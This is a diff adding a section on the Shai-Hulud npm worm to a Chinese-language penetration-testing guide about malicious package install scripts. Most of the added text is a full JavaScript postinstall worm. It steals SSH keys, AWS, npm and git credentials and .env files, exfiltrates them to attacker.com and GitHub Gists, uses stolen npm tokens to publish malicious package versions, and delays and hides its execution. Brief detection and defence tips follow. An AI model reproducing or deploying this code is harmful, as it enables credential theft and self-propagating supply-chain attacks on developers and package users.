@@ -8,11 +8,13 @@
 - 为渗透测试人员提供恶意脚本执行攻击的系统化方法
 - 指导测试人员识别和利用包管理器中的脚本执行机制
 - 帮助理解 npm、pip 等包安装过程中的脚本执行风险
+- 补充 Shai-Hulud npm 蠕虫等自我传播攻击技术
 
 ## 1.2 适用范围
 - 适用于使用 npm、pip、Gem、Composer 等包管理器的场景
 - 适用于有 postinstall、preinstall 等生命周期脚本的包
 - 适用于自动化安装依赖的 CI/CD 流程
+- 适用于 npm 生态系统的供应链攻击场景
 
 ## 1.3 读者对象
 - 渗透测试工程师
@@ -381,6 +383,240 @@ find node_modules -name "package.json" -exec grep -l "postinstall\|preinstall" {
 | lockfile-lint | 锁文件完整性检查 | https://github.com/lirantal/lockfile-lint |
 | audit-ci | CI 中的 npm audit | https://github.com/IBM/audit-ci |
 | snyk | 依赖安全扫描 | https://snyk.io/ |
+
+---
+
+## 专题二：Shai-Hulud npm 蠕虫攻击技术
+
+### 攻击概述
+- **名称**：Shai-Hulud 供应链攻击（2025 年）
+- **类型**：首个成功的自我传播 npm 蠕虫
+- **影响**：传播超过 500 个包版本，被 npm 中断
+- **意义**：开发者机器成为供应链攻击的主要目标
+
+### 攻击原理
+
+```
+┌─────────────────────────────────────────────────────────────┐
+│              Shai-Hulud npm 蠕虫传播机制                      │
+├─────────────────────────────────────────────────────────────┤
+│  1. 初始入侵                                                │
+│     - 攻陷流行 npm 包或维护者账户                            │
+│     - 发布包含恶意 postinstall 脚本的版本                    │
+├─────────────────────────────────────────────────────────────┤
+│  2. 数据窃取                                                │
+│     - postinstall 脚本收集敏感数据                           │
+│     - 外泄到公共 GitHub 仓库                                 │
+│     - 窃取目标：.npmrc、SSH 密钥、.env 文件等                │
+├─────────────────────────────────────────────────────────────┤
+│  3. 凭证利用                                                │
+│     - 检测受害者环境中的 npm tokens                          │
+│     - 使用窃取的凭证访问 npm 账户                            │
+│     - 获取可访问的包列表                                     │
+├─────────────────────────────────────────────────────────────┤
+│  4. 自我传播                                                │
+│     - 自动推送恶意版本到窃取的包                             │
+│     - 添加相同的 postinstall 脚本                            │
+│     - 循环传播，感染更多用户                                 │
+└─────────────────────────────────────────────────────────────┘
+```
+
+### 恶意脚本实现
+
+```javascript
+// postinstall.js - Shai-Hulud 风格蠕虫脚本
+const https = require('https');
+const { execSync } = require('child_process');
+const fs = require('fs');
+const path = require('path');
+const os = require('os');
+
+// ========== 第一阶段：数据窃取 ==========
+
+function stealSensitiveFiles() {
+  const filesToSteal = [
+    path.join(os.homedir(), '.npmrc'),
+    path.join(os.homedir(), '.ssh', 'id_rsa'),
+    path.join(os.homedir(), '.aws', 'credentials'),
+    path.join(process.cwd(), '.env'),
+    path.join(os.homedir(), '.git-credentials')
+  ];
+  
+  let stolenData = {};
+  
+  filesToSteal.forEach(file => {
+    try {
+      const content = fs.readFileSync(file, 'utf8');
+      stolenData[file] = content;
+      
+      // 外泄到攻击者服务器或 GitHub Gist
+      exfiltrateData(file, content);
+    } catch(e) {
+      // 文件不存在，跳过
+    }
+  });
+  
+  return stolenData;
+}
+
+function exfiltrateData(filename, content) {
+  const encoded = Buffer.from(content).toString('base64');
+  
+  // 方法 1：发送到攻击者服务器
+  https.get(`https://attacker.com/exfil?f=${encodeURIComponent(filename)}&d=${encoded}`);
+  
+  // 方法 2：发送到 GitHub Gist（更隐蔽）
+  // 使用窃取的 GitHub token
+  const githubToken = process.env.GITHUB_TOKEN;
+  if (githubToken) {
+    const req = https.request({
+      hostname: 'api.github.com',
+      path: '/gists',
+      method: 'POST',
+      headers: {
+        'Authorization': `token ${githubToken}`,
+        'User-Agent': 'npm-package'
+      }
+    }, (res) => {});
+    
+    req.write(JSON.stringify({
+      files: {
+        [filename]: { content: content }
+      }
+    }));
+    req.end();
+  }
+}
+
+// ========== 第二阶段：凭证窃取与传播 ==========
+
+function extractNpmTokens() {
+  const tokens = {};
+  
+  // 从环境变量提取
+  if (process.env.NPM_TOKEN) tokens.NPM_TOKEN = process.env.NPM_TOKEN;
+  if (process.env.NODE_AUTH_TOKEN) tokens.NODE_AUTH_TOKEN = process.env.NODE_AUTH_TOKEN;
+  
+  // 从.npmrc 提取
+  try {
+    const npmrc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');
+    const tokenMatch = npmrc.match(/_authToken=(.+)/);
+    if (tokenMatch) {
+      tokens.authToken = tokenMatch[1];
+    }
+  } catch(e) {}
+  
+  return tokens;
+}
+
+function propagateWithStolenToken(token) {
+  // 使用窃取的 token 获取可访问的包列表
+  const req = https.request({
+    hostname: 'registry.npmjs.org',
+    path: '/-/orgs/-/package',
+    method: 'GET',
+    headers: {
+      'Authorization': `Bearer ${token}`,
+      'Accept': 'application/json'
+    }
+  }, (res) => {
+    let data = '';
+    res.on('data', chunk => data += chunk);
+    res.on('end', () => {
+      try {
+        const packages = JSON.parse(data);
+        // 遍历可访问的包，发布恶意版本
+        packages.forEach(pkg => {
+          publishMaliciousVersion(pkg.name, token);
+        });
+      } catch(e) {}
+    });
+  });
+  
+  req.end();
+}
+
+function publishMaliciousVersion(packageName, token) {
+  // 1. 下载当前包
+  // 2. 添加恶意 postinstall 脚本
+  // 3. 版本号增加 0.0.1-patch
+  // 4. 发布新版本
+  
+  const maliciousPackageJson = {
+    name: packageName,
+    version: '1.0.1-patch',  // 小版本更新，不易察觉
+    scripts: {
+      postinstall: 'node .hooks/init.js'  // 恶意脚本
+    }
+  };
+  
+  // 使用窃取的 token 发布
+  const req = https.request({
+    hostname: 'registry.npmjs.org',
+    path: `/${packageName}/-/${packageName}-1.0.1-patch.tgz`,
+    method: 'PUT',
+    headers: {
+      'Authorization': `Bearer ${token}`,
+      'Content-Type': 'application/octet-stream'
+    }
+  }, (res) => {
+    if (res.statusCode === 200 || res.statusCode === 201) {
+      console.log(`Successfully published malicious version of ${packageName}`);
+    }
+  });
+  
+  req.end();
+}
+
+// ========== 第三阶段：执行 ==========
+
+// 延迟执行，绕过检测
+setTimeout(() => {
+  try {
+    // 窃取数据
+    const stolen = stealSensitiveFiles();
+    
+    // 提取凭证
+    const tokens = extractNpmTokens();
+    
+    // 如果有 npm token，开始传播
+    if (tokens.authToken || tokens.NPM_TOKEN) {
+      const token = tokens.authToken || tokens.NPM_TOKEN;
+      propagateWithStolenToken(token);
+    }
+  } catch(e) {
+    // 静默失败，避免被发现
+  }
+}, 60000);  // 1 分钟后执行
+```
+
+### 传播特征
+
+| 特征 | 描述 | 检测方法 |
+|-----|------|---------|
+| 快速传播 | 数小时内感染 500+ 包 | 监控 npm 发布频率 |
+| 凭证窃取 | 窃取 npm、GitHub、AWS 凭证 | 监控异常网络请求 |
+| 自我复制 | 自动发布恶意包版本 | 监控包发布来源 IP |
+| 隐蔽执行 | 延迟执行、条件触发 | 行为监控、沙箱分析 |
+
+### 防御措施
+
+```bash
+# 1. 禁用 postinstall 脚本
+npm install --ignore-scripts
+
+# 2. 使用锁定文件
+# 确保只安装已知安全的版本
+
+# 3. 启用双因素认证
+# 保护 npm 和 GitHub 账户
+
+# 4. 使用最小权限 token
+# 限制 token 的包发布权限
+
+# 5. 监控异常发布
+# 设置包发布告警
+```
 
 ---
 
